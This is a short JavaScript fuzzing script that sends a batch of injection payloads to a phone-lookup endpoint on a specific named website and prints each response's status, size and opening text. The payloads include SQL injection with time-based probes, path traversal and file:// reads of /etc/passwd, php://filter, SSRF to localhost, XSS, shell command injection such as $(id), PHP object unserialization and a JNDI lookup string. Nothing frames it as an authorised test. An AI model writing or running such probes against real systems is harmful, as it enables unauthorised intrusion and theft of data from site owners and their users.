import { makeClient } from './lib.mjs';
const c = makeClient('https://tutorialinjectid.my.id');
const base = '/lacak-nomor/process.php?phone=0812';
const payloads = {
  'normal': '', 'squote': "'", 'dquote': '"', 'backtick': '`', 'semicolon': ';', 'pipe': '|',
  'or_1eq1': "%20OR%201%3D1", 'union': '%20UNION%20SELECT%201', 'select': '%20SELECT%201',
  'sleep_up': '%20SLEEP(3)', 'sleep_low': '%20sleep(3)', 'benchmark': '%20BENCHMARK(3000000,MD5(1))',
  'waitfor': "%20WAITFOR%20DELAY", 'dotslash': '../../../etc/passwd', 'phpfilter': 'php://filter',
  'file': 'file:///etc/passwd', 'http_local': 'http://127.0.0.1/', 'script_tag': '<script>alert(1)</script>',
  'img_onerror': '<img%20src=x%20onerror=alert(1)>', 'alert': 'alert(1)', 'cat': 'cat%20/etc/passwd',
  'backtickcmd': '%60id%60', 'dollar': '$(id)', 'nullbyte': '%00', 'sqli_comment': '--',
  'sqli_paren': '%27)%20AND%201%3D1%20--%20', 'concat': '%27%20||%201%7C%7C%27', 'subselect': '%28SELECT%201%29',
  'info_schema': 'information_schema', 'php_unserialize': 'O:8:"x":1:{}', 'jndi': '$%7Bjndi:ldap://x%7D',
  'sqli_cond': '%27%20OR%20CASE%20WHEN%201%3D1%20THEN%201%20ELSE%200%20END%20OR%20%27',
};
const keys = Object.keys(payloads);
const out = [];
async function work(list) { for (const k of list) { const r = await c.get(base + payloads[k]); out.push([k, r.status, r.body.length, (r.body || '').replace(/\s+/g, ' ').slice(0, 70)]); } }
const n = 4; const b = Array.from({ length: n }, () => []); keys.forEach((k, i) => b[i % n].push(k));
await Promise.all(b.map(work));
for (const [k, s, l, t] of out.sort((a, z) => String(a[1]).localeCompare(String(z[1])))) console.log(String(s).padEnd(4), String(l).padEnd(7), k.padEnd(16), t);
